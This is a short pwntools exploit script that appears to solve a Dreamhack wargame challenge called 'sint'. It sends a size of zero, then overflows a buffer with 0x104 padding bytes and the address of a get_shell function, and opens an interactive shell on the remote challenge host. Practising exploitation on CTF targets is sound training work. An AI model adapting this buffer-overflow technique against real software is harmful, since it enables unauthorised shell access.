from pwn import *
from pwn import p32


p = remote('host3.dreamhack.games', 24121)
e = ELF('./a/sint')
get_shell = e.symbols['get_shell']

p.sendlineafter(b'Size: ', b'0')

buf = b'A' * 0x104 + p32(get_shell)
p.sendafter(b'Data: ', buf)

p.interactive()